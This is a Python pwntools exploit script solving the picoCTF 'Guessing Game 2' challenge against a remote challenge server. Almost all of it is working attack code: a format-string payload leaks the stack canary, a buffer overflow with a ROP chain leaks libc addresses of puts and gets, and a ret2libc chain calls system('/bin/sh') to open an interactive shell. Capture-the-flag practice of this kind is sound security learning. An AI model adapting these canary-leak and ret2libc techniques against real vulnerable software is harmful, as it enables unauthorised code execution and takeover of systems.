#fermat-strings
import struct
from pwn import *
from queue import Queue
from threading import Thread

#####################################################change directory#################################3
level = "Guessing Game 2"
ip = "jupiter.challenges.picoctf.org:43578"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

########################################operation mode#########################################
args.DEBUG = False
args.REMOTE = True
#####################################setup solution################################################
context.arch = 'i386'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/vuln")
libc = ELF(dir + "/libc_v2.36_6.so")
#######################################start process#############################################
def conn():
    if args.REMOTE:
        global libc
        libc = ELF(dir + "/libc_v2.27_6.so")
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG:
        return gdb.debug(binary.path, gdbscript="break *0x400947\nc\nx/24wx 0x601058\n")
    else:
        return process([binary.path])
r = conn()
#################################vuln constants information########################################
already_written = 0
canary_offset = 135
winning = "-447"
if args.REMOTE:
    winning = "-3727"
overflow_offset = 528
####################################finding canary constant############################################
payload = f"%{canary_offset}$p".encode()
r.sendlineafter("?", winning)
r.sendlineafter("?", payload)
canary = int(r.recvline().decode().split(" ")[2].strip(), 16)
log.info("value of canary: " + hex(canary))
##################################ret2libc with buffer overflow########################################
overflow = b"a"*512 + struct.pack("I", canary) + b"a"*12
rop_elf = ROP(binary)
rop_elf.call(binary.plt['puts'], [binary.got['puts']])
if args.REMOTE:
    rop_elf.call(binary.plt['puts'], [next(binary.search(b""))])
rop_elf.call(binary.plt['puts'], [binary.got['gets']])
rop_elf.call((rop_elf.find_gadget(["ret"]))[0])
rop_elf.call(binary.symbols['win'])

rop_get_libc_aslr_addr = overflow + rop_elf.chain()
log.info(rop_elf.dump())

r.sendlineafter("?", winning)
r.sendlineafter("?", rop_get_libc_aslr_addr)
r.recvline()
r.recvline()
leaked_addr_puts_libc = struct.unpack("I", r.recv(4))[0]
r.recvline()
r.recvline()
leaked_addr_gets_libc = struct.unpack("I", r.recv(4))[0]
log.info("address of puts: " + hex(leaked_addr_puts_libc))
log.info("address of gets: " + hex(leaked_addr_gets_libc))

#######find libc version and set it in ROP#############
server_libc_base_addr = leaked_addr_puts_libc - libc.symbols['puts']
log.info("Leaked server's libc address, puts(): " + hex(server_libc_base_addr))

libc.address = server_libc_base_addr
log.info("guessed address of system: " + hex(libc.symbols['system']))
###########Craft ROP exploit to system call Bash##########
rop_libc = ROP(libc)
rop_libc.call((rop_libc.find_gadget(["ret"]))[0])
rop_libc.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])
rop_get_bash_exploit = overflow + rop_libc.chain()
log.info(rop_libc.dump())
r.sendlineafter("?", rop_get_bash_exploit)
##################################final interaction###############################################

r.interactive()